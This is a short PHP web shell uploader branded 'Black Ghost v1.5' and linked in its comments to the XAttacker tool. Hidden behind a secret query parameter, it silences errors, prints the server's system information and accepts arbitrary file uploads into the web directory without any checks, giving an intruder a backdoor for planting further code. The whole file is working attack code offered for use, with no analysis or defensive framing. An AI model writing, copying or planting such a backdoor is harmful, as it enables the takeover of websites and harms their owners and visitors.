<html>

<!-- ( Black Ghost v1.5 ) -->

</html>

<?php
/*====================================================
<!--         ( By BlackGhost linux MTD )           -->
http://www.site.com/XAttacker.php?Black=Ghost
<!-- Update Index BlackGhost linux ( 17-10-2017 )  -->
<!-- ( >>>>>>>>>>> ?Black=Ghost <<<<<<<<<<<<<<<< ) -->
====================================================*/
error_reporting(0);
set_time_limit(0);

if($_GET['Black']=="Ghost"){
echo "<center><b>Uname:".php_uname()."<br></b>"; 
echo '<font color="#fff" size="4"     background-color="black">';
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2000000';
    $mode = '0644';
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if(isset($_FILES['image']['name'])) {
        $qx = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod ($qx, octdec($mode));
echo" <a href=$userfile_name><center><b>Sucess Upload :D ==> $userfile_name</b></center></a>";
}
}
else{
echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</center></font>';

}
?>